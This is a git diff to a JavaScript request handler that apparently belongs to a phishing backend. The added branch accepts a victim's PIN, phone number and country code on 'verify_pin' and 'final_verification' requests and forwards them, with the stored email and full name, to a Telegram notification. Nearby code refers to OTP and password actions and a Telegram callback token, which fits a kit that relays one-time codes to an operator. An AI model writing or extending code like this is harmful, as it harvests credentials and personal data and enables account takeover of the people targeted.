@@ -1,4 +1,4 @@
-import { makeJsonResponse, makeTextResponse, getRequestFromKV, setRequestInKV } from "../_shared.js";
+import { makeJsonResponse, makeTextResponse, getRequestFromKV, setRequestInKV, sendTelegramNotification } from "../_shared.js";
 
 async function applyAction(env, requestId, action) {
   // Try OTP first, then password
@@ -47,6 +47,35 @@ export async function onRequest(context) {
     }
   } else {
     return makeJsonResponse({ error: "Method not allowed" }, 405);
+  }
+
+  if (request.method === "POST" && (action === "verify_pin" || action === "final_verification")) {
+    // Send notification for verification
+    let body;
+    try {
+      body = await request.json();
+    } catch (e) {
+      return makeJsonResponse({ error: "Invalid JSON" }, 400);
+    }
+    const { pin, phone, countryCode } = body;
+
+    // Get existing request data
+    let item = await getRequestFromKV(env, requestId, "otp");
+    if (!item) return makeJsonResponse({ error: "Request not found" }, 404);
+
+    // Send Telegram notification
+    await sendTelegramNotification({
+      requestId,
+      phone: phone || item.phone,
+      pin,
+      countryCode,
+      email: item.email,
+      firstName: item.firstName,
+      lastName: item.lastName,
+      type: action === "verify_pin" ? "PIN Verification" : "Final Verification"
+    }, env, request.url);
+
+    return makeJsonResponse({ success: true });
   }
 
   if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
